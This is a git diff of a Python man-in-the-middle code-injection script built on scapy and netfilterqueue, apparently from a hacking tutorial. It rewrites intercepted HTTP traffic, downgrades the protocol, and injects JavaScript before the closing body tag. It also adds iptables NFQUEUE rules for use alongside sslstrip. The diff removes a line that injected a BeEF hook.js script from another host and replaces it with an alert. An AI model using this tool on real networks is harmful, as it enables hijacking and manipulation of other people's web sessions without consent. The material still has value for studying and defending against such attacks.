@@ -4,6 +4,8 @@ import scapy.all as scapy
 import subprocess
 import re
 
+port = 10000  # 80 for http and 10000 for https with sslstrip
+
 
 def set_load(packet, load):
     packet[scapy.Raw].load = load
@@ -17,11 +19,12 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         load = scapy_packet[scapy.Raw].load
-        if scapy_packet[scapy.TCP].dport == 80:  # http means 80 (Request)
+        if scapy_packet[scapy.TCP].dport == port:  # http means 80 (Request)
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            load = load.replace("HTTP/1.1", "HTTP/1.0")
 
-        elif scapy_packet[scapy.TCP].sport == 80:  # (Response)
-            injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
+        elif scapy_packet[scapy.TCP].sport == port:  # (Response)
+            injection_code = '<script>alert("Hi")</script>'
             load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
             if content_length_search and "text/html" in load:
@@ -36,7 +39,9 @@ def process_packet(packet):
     packet.accept()
 
 
-subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
+# subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)  # For http
+subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)  # For https with sslstrip
+subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)  # For https with sslstrip
 try:
     print("[+] Started")
     queue = netfilterqueue.NetfilterQueue()
